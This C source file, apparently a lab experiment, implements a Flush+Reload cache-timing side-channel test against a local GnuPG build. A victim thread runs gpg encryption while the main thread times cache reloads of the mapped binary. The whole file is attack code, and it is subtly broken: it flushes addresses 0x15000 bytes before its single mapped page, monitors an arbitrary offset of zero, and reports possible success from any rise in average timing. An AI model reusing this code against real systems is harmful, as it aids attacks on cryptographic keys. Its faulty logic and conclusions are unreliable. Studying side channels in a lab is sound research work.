// created by nevin
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>

#define CACHE_HIT_THRESHOLD 80
#define TEST_DURATION_SECONDS 2
#define SAMPLE_RATE_US 1000  // 1ms between samples

void flush(void *addr) {
    asm volatile("clflush (%0)" : : "r"(addr) : "memory");
}

uint64_t reload(void *addr) {
    unsigned int junk;
    uint64_t time1 = __rdtscp(&junk);
    junk = *(volatile unsigned int *)addr;
    return __rdtscp(&junk) - time1;
}

void *map_gnupg() {
    int fd = open("/home/ev/genkin/flush_reload/gnupg-install/bin/gpg", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return NULL;
    }
    
    void *map = mmap(NULL, sysconf(_SC_PAGESIZE), 
                    PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    return map;
}

void flush_entire_gnupg(void *base_addr) {
    // Flush the entire mapped GnuPG library from cache
    char *addr = (char *)base_addr;
    for (int i = 0; i < sysconf(_SC_PAGESIZE); i += 64) {  // Cache line size
        flush(addr + i);
    }
}

void baseline_test(void *target_addr, uint64_t *times, int *count) {
    printf("=== BASELINE TEST (No Victim Process) ===\n");
    printf("Running for %d seconds...\n", TEST_DURATION_SECONDS);
    
    int samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
    *count = 0;
    
    for (int i = 0; i < samples; i++) {
        flush(target_addr);
        usleep(SAMPLE_RATE_US);
        
        uint64_t time = reload(target_addr);
        times[*count] = time;
        (*count)++;
        
        if (i % 100 == 0) {
            printf("Sample %d: %lu cycles\n", i, time);
        }
    }
    
    printf("Baseline test completed. Collected %d samples.\n", *count);
}

void attack_test(void *target_addr, uint64_t *times, int *count) {
    printf("\n=== ATTACK TEST (With Victim Process) ===\n");
    printf("Flushing entire GnuPG library and monitoring...\n");
    
    int samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
    *count = 0;
    
    for (int i = 0; i < samples; i++) {
        flush_entire_gnupg(target_addr - 0x15000);  // Flush entire library
        usleep(SAMPLE_RATE_US);
        
        uint64_t time = reload(target_addr);
        times[*count] = time;
        (*count)++;
        
        if (i % 100 == 0) {
            printf("Sample %d: %lu cycles\n", i, time);
        }
    }
    
    printf("Attack test completed. Collected %d samples.\n", *count);
}

void victim() {
    // Set CPU affinity to different core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    printf("Victim: Starting encryption on core 1\n");
    
    // Run victim process for the duration of the attack test
    for (int i = 0; i < TEST_DURATION_SECONDS * 2; i++) {
        system("echo 'test message' | /home/ev/genkin/flush_reload/gnupg-install/bin/gpg --encrypt --recipient test@test.com 2>/dev/null");
        usleep(500000);  // 0.5 second intervals
    }
}

double calculate_average(uint64_t *times, int count) {
    if (count == 0) return 0.0;
    
    uint64_t sum = 0;
    for (int i = 0; i < count; i++) {
        sum += times[i];
    }
    return (double)sum / count;
}

void write_results(double baseline_avg, double attack_avg, int baseline_count, int attack_count) {
    FILE *fp = fopen("flush_reload_results.txt", "w");
    if (!fp) {
        perror("Failed to open results file");
        return;
    }
    
    fprintf(fp, "Flush+Reload Attack Test Results\n");
    fprintf(fp, "================================\n\n");
    fprintf(fp, "Baseline Test (No Victim):\n");
    fprintf(fp, "  Samples: %d\n", baseline_count);
    fprintf(fp, "  Average Reload Time: %.2f cycles\n\n", baseline_avg);
    
    fprintf(fp, "Attack Test (With Victim):\n");
    fprintf(fp, "  Samples: %d\n", attack_count);
    fprintf(fp, "  Average Reload Time: %.2f cycles\n\n", attack_avg);
    
    fprintf(fp, "Analysis:\n");
    if (attack_avg > baseline_avg) {
        fprintf(fp, "  Cache misses detected! Attack may be successful.\n");
        fprintf(fp, "  Difference: %.2f cycles (%.1f%% increase)\n", 
                attack_avg - baseline_avg, 
                ((attack_avg - baseline_avg) / baseline_avg) * 100);
    } else {
        fprintf(fp, "  No significant cache miss pattern detected.\n");
        fprintf(fp, "  Difference: %.2f cycles (%.1f%% change)\n", 
                attack_avg - baseline_avg, 
                ((attack_avg - baseline_avg) / baseline_avg) * 100);
    }
    
    fclose(fp);
    printf("\nResults written to flush_reload_results.txt\n");
}

int main() {
    // Set attacker to core 0
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    void *target = map_gnupg();
    if (!target) {
        printf("Failed to map GnuPG\n");
        return 1;
    }
    
    void *target_addr = target + 0x000;  // Target offset in GnuPG
    
    printf("GnuPG mapped at %p, monitoring at %p\n", target, target_addr);
    
    // Allocate arrays for timing data
    int max_samples = (TEST_DURATION_SECONDS * 1000000) / SAMPLE_RATE_US;
    uint64_t *baseline_times = malloc(max_samples * sizeof(uint64_t));
    uint64_t *attack_times = malloc(max_samples * sizeof(uint64_t));
    
    if (!baseline_times || !attack_times) {
        printf("Failed to allocate memory\n");
        return 1;
    }
    
    int baseline_count, attack_count;
    
    // Run baseline test (no victim)
    baseline_test(target_addr, baseline_times, &baseline_count);
    
    // Start victim process
    pthread_t victim_thread;
    pthread_create(&victim_thread, NULL, (void*)victim, NULL);
    
    // Small delay to let victim start
    usleep(100000);
    
    // Run attack test (with victim)
    attack_test(target_addr, attack_times, &attack_count);
    
    // Wait for victim to complete
    pthread_join(victim_thread, NULL);
    
    // Calculate averages and write results
    double baseline_avg = calculate_average(baseline_times, baseline_count);
    double attack_avg = calculate_average(attack_times, attack_count);
    
    printf("\n=== RESULTS ===\n");
    printf("Baseline average: %.2f cycles (%d samples)\n", baseline_avg, baseline_count);
    printf("Attack average: %.2f cycles (%d samples)\n", attack_avg, attack_count);
    
    write_results(baseline_avg, attack_avg, baseline_count, attack_count);
    
    // Cleanup
    free(baseline_times);
    free(attack_times);
    munmap(target, sysconf(_SC_PAGESIZE));
    
    return 0;
}
